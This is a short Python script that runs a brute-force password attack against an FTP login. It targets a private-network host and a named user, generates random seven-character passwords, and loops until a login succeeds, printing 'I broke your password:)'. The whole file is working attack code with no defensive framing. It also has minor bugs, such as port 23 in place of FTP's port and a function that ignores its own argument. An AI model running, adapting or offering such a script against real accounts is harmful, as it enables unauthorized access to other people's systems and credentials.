import random
import ftplib
import time

password_list = []
host = "192.168.1.2"
user = "Soheil"
port = 23


def shuffle(string):
    temp_list = list(string)
    random.shuffle(temp_list)
    return ''.join(temp_list)


def password_generator():
    a = chr(random.randint(65, 90))
    b = chr(random.randint(65, 90))
    c = chr(random.randint(97, 122))
    d = chr(random.randint(97, 122))
    e = chr(random.randint(97, 122))
    f = chr(random.randint(48, 57))
    g = chr(random.randint(48, 57))
    uppercase_combination = a + b
    lowercase_combination = c + d + e
    digit_combination = f + g
    generated_password = uppercase_combination + lowercase_combination + digit_combination
    generated_password = shuffle(generated_password)
    return generated_password


def check_password(t):
    server = ftplib.FTP()
    try:
        server.connect(host, port, timeout=5)
        print("success in connection!")
        server.login(user, password)
    except ftplib.error_perm:
        return False
    else:
        return True


start_time = time.time()
while True:
    password = password_generator()
    if password in password_list:
        continue
    else:
        if check_password(password):
            print("I broke your password:)")
            end_time = time.time()
            break
        else:
            password_list.append(password)
            print("not this time!)")
            continue

print(time.time()- start_time)




